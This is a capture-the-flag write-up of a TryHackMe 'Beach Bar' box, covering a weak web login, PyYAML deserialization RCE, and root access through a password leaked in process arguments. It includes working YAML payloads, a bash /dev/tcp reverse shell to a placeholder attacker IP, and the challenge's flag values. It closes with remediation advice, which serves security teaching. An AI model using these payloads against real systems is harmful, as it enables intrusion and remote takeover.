# TryHackMe — Beach Bar (Hacker Holidays 2026, Day 5)

**Category:** Boot2Root (Web)
**Difficulty:** Easy
**Points:** 60
**Target:** `10.112.175.35`

---

## Challenge Brief

> At the Beach Bar, even shell access is complimentary. The jukebox takes requests. Any kind.

The briefing hints: a DJ who never logs out, a song queue that accepts "a little more than song titles," and a service down the boardwalk quietly announcing "something." These clues map directly onto the vulnerabilities found during the box: a weak web login, an insecure YAML deserialization bug, and a root process leaking its password via command-line arguments.

---

## 1. Reconnaissance

Started with a full TCP port scan:

```bash
nmap -sC -sV -p- -T4 10.112.175.35
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
| http-title: Beach Bar // Sign in
|_Requested resource was /login
```

Only two ports open:
- **22/tcp** — SSH (key-based auth only, confirmed with `-o PreferredAuthentications=password -o PubkeyAuthentication=no`, which was rejected)
- **80/tcp** — a Gunicorn-served Flask web app redirecting to `/login`

SSH being locked to key auth ruled it out as an entry point, pointing all attention to the web application.

---

## 2. Initial Access — Web Login

The web app presented a "Beach Bar // Sign in" page. Testing weak/guessable credentials:

```
Username: dj
Password: dj
```

Login succeeded. This granted access to an authenticated dashboard with a jukebox-themed interface, including an **"Import Playlist"** feature.

---

## 3. RCE via Insecure YAML Deserialization

The `/import` page allowed pasting or uploading a YAML playlist:

> Paste a playlist (YAML) or upload a `.yml` set exported from another night.

Inspecting the app's source (`/opt/beach-bar/webapp/app.py`, later confirmed readable after foothold) showed the vulnerable code:

```python
@app.route("/import", methods=["GET", "POST"])
@login_required
def import_playlist():
    ...
    parsed = yaml.load(content, Loader=yaml.Loader)
    ...
```

Using `yaml.load()` with the default/full `Loader` (instead of `yaml.safe_load()`) allows PyYAML to deserialize arbitrary Python object tags — a classic **insecure deserialization → RCE** vulnerability.

### Proof of Concept

Submitted the following as the "Playlist YAML" input:

```yaml
!!python/object/apply:subprocess.check_output
args: [['id']]
```

**Response:**
```
b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n'
```

Confirmed arbitrary command execution as the `bartender` system user.

### Getting a Reverse Shell

`subprocess.check_output` blocks until the command finishes, which caused a 500 error when trying to pipe a reverse shell through it directly (the shell never "finishes"). Switched to `os.system` and backgrounded the payload so the HTTP request could return normally:

```yaml
!!python/object/apply:os.system
args: ['bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1 &"']
```

Listener on the attack box:

```bash
nc -lvnp 4444
```

Shell caught:

```
connect to [ATTACKER_IP] from (UNKNOWN) [10.112.175.35] 52880
bartender@tryhackme-2404:/opt/beach-bar/webapp$
```

Stabilized the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### User Flag

```bash
find / -name "user.txt" 2>/dev/null
cat /home/bartender/user.txt
```

```
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

---

## 4. Privilege Escalation — Credential Leak via Process Arguments

Standard privesc enumeration (`sudo -l`, SUID binaries, cron jobs, writable files) turned up nothing immediately exploitable. The breakthrough came from checking running processes:

```bash
ps aux | grep -v grep
```

**Key finding:**

```
root  618  ...  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

A **root-owned process** was launched with a plaintext password (`SunsetSpritz2024!`) passed directly as a command-line argument. On Linux, any local user can read another process's full command line via `/proc/<pid>/cmdline` or simply `ps aux` — making this a classic **credential exposure via process arguments** misconfiguration.

Inspecting `/opt/beach-bar/jukeboxd/jukeboxd.py` confirmed the password wasn't even used for anything functional in the script — it existed purely as an artifact/clue, but the same value turned out to be **reused as the actual root account password**.

### Escalating to Root

```bash
su root
Password: SunsetSpritz2024!
```

```
root@tryhackme-2404:/opt/beach-bar/webapp#
```

### Root Flag

```bash
cat /root/root.txt
```

```
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

---

## Flags

| Flag | Value |
|---|---|
| User | `THM{y4ml_pl4yl1st_pwns_th3_b34ch}` |
| Root | `THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}` |

---

## Root Cause Summary

| # | Weakness | Impact |
|---|----------|--------|
| 1 | Weak/default credentials (`dj:dj`) on the web login | Initial authenticated access |
| 2 | `yaml.load()` instead of `yaml.safe_load()` in the playlist import feature | Remote Code Execution as `bartender` |
| 3 | Root-owned process launched with a password in its command-line arguments | Password disclosure via `ps aux` |
| 4 | Password reuse between the leaked "stream password" and the actual root account | Full privilege escalation to root |

## Remediation Notes

- Always use `yaml.safe_load()` (or the `SafeLoader`) when parsing untrusted YAML input — never the default `Loader`, which permits arbitrary Python object construction.
- Never pass secrets via command-line arguments; use environment variables, config files with restricted permissions, or a secrets manager instead — process arguments are readable by any local user via `/proc/<pid>/cmdline`.
- Avoid credential reuse across services and accounts — a secret meant for one internal service should never double as another account's password.
- Enforce strong, unique credentials for all application-level logins, not just system accounts.

## Tools Used

- `nmap` — port/service enumeration
- Web browser / dev tools — exploring the jukebox app
- Custom PyYAML deserialization payloads — RCE
- `nc` — reverse shell listener
- Standard Linux privesc enumeration (`ps aux`, `sudo -l`, `find`)
